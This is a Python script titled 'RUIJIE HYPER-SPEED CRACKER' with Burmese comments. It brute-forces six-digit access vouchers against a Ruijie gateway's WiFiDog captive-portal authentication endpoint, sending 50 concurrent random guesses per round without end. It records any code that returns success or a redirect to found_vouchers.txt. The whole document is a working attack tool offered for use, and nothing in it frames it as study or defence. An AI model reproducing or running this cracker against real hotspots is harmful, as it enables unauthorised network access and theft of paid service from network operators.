import sys, os, asyncio, aiohttp, random
from colorama import Fore, init

init(autoreset=True)

# Canary Data
TARGET_IP = "192.168.110.1"
GW_ID = "58b4bbd9c1e9"
GW_SN = "H1U42FJ004707"

FOUND_VOUCHERS = []

async def check_voucher(session, v):
    global FOUND_VOUCHERS
    url = f"http://{TARGET_IP}:2060/wifidog/auth"
    params = {"token": v, "gw_id": GW_ID, "gw_sn": GW_SN}
    
    try:
        # Timeout ကို အရမ်းတိုအောင်ထားပြီး အမြန်ပစ်မယ်
        async with session.get(url, params=params, timeout=0.8) as res:
            text = await res.text()
            if "success" in text.lower() or res.status == 302:
                if v not in FOUND_VOUCHERS:
                    FOUND_VOUCHERS.append(v)
                    with open("found_vouchers.txt", "a") as f:
                        f.write(f"{v}\n")
                    return True
    except:
        pass
    return False

async def start_cracking():
    os.system('clear')
    print(f"{Fore.MAGENTA}========================================")
    print(f"{Fore.WHITE}   RUIJIE HYPER-SPEED CRACKER (V3)")
    print(f"{Fore.MAGENTA}========================================\n")

    async with aiohttp.ClientSession() as session:
        while True:
            # တစ်ခါတည်း လမ်းကြောင်း ၅၀ အပြိုင်ပစ်မယ်
            tasks = []
            v_list = [str(random.randint(100000, 999999)) for _ in range(50)]
            
            # Display scanning
            scan_display = " ".join([f"{Fore.YELLOW}{c}" for c in v_list[:5]])
            sys.stdout.write(f"\r{Fore.CYAN}[SCANNING] {scan_display} (+45 more...)")
            sys.stdout.flush()

            for v in v_list:
                tasks.append(check_voucher(session, v))
            
            await asyncio.gather(*tasks)

            # အမှန်တွေ့တာရှိရင် အပေါ်မှာ တန်းပြမယ်
            if FOUND_VOUCHERS:
                valid_display = " ".join([f"{Fore.GREEN}{c}" for c in FOUND_VOUCHERS])
                # Cursor ကို အပေါ်တင်ပြီး Found စာရင်းပြခြင်း
                sys.stdout.write("\033[K")
                print(f"\n{Fore.GREEN}[FOUND] {valid_display}\033[F")

            # CPU မဟန်းအောင် ခဏလေး အသက်ရှူပေးမယ်
            await asyncio.sleep(0.01)

if __name__ == "__main__":
    try:
        # လိုအပ်တဲ့ Library မရှိရင် သွင်းဖို့ပြောမယ်
        import aiohttp
        asyncio.run(start_cracking())
    except ImportError:
        print(f"{Fore.RED}[!] Please run: pip install aiohttp")
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Paused.")
